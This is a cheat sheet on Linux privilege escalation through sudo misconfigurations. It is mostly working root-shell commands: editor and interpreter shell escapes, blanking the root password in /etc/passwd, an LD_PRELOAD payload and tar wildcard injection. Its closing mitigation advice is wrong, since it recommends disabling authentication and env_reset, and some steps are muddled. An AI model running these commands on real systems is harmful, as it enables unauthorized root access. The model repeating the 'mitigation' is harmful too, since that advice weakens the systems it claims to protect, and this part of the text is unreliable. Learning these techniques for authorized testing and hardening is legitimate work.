**Elevating Privilege through `sudo`**

Privilege escalation through `sudo` misconfigurations occurs when a low-privileged user can execute commands with root privileges because Administrator has done incorrect `sudoers` settings and given unintended privilege to a normal user.

**To check what commands you can run with `sudo`, use:**
```
sudo -l
```
If the output shows commands that can be run as root (`(ALL) NOPASSWD:`) without a password, it may be exploitable.

**If `sudo -l` shows:**
```
(root) NOPASSWD: /bin/su
```
**You can escalate privileges with:**
```
sudo su
```

**If `sudo -l` allows:**
```
(root) NOPASSWD: /bin/bash
```
**You can get a root shell:**
```
sudo -i
```
**or**
```
sudo /bin/bash
```

**If `sudo` allows executing an unrestricted binary like `vim`, `awk`, or `python`, you can escalate privileges:**
```
sudo vim -c ':!sh'
sudo awk 'BEGIN {system("/bin/sh")}'
sudo less /etc/passwd
!/bin/sh
sudo perl -e 'exec "/bin/sh";'
sudo python3 -c 'import os; os.system("/bin/sh")'
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```
More exploitable binaries can be found at **[GTFOBins](https://gtfobins.github.io/)**.

**If `sudo` allows running `nano`, `vi`, or `vim` on system files:**
```
(root) NOPASSWD: /usr/bin/nano /etc/passwd
```
**You can edit `/etc/passwd` to remove the root password:**
```
sudo nano /etc/passwd
```
**Modify the root entry:**
```
root:x:0:0:root:/root:/bin/bash
```
**to:**
```
root::0:0:root:/root:/bin/bash
```
**Save and exit, then switch to root without a password:**
```
su root
```

**If `sudo -l` allows executing a script:**
```
(root) NOPASSWD: /path/to/script.sh
```
**Modify the script:**
```
echo "/bin/bash" >> /path/to/script.sh
sudo /path/to/script.sh
```

**If `sudo` allows running commands but does not clear environment variables:**
```
echo 'int main() { setgid(0); setuid(0); system("/bin/sh"); }' > /tmp/root.c
gcc -fPIC -shared -o /tmp/root.so /tmp/root.c -nostartfiles
sudo LD_PRELOAD=/tmp/root.so /bin/bash
```

**If `sudo` allows commands like:**
```
(root) NOPASSWD: /bin/tar * 
```
**You can execute arbitrary commands:**
```
echo "id" > /tmp/exploit.sh
chmod +x /tmp/exploit.sh
echo "sh 0<&2 1>&2" > /tmp/--checkpoint-action=exec=sh
echo "sh 0<&2 1>&2" > /tmp/--checkpoint=1
sudo tar -cf /dev/null /tmp/*
```

**To mitigate risks:
Restrict `sudoers` settings:**
  ```
  visudo
  ```
**Ensure:**
  ```
  Defaults !authenticate, !env_reset, secure_path
  ```
**Remove unnecessary `sudo` permissions:**
  ```
  sudo visudo
  ```
 **Remove lines like:**
  ```
  ALL=(ALL) NOPASSWD: ALL
  ```
And follow least privilege principles to prevent exploitation.

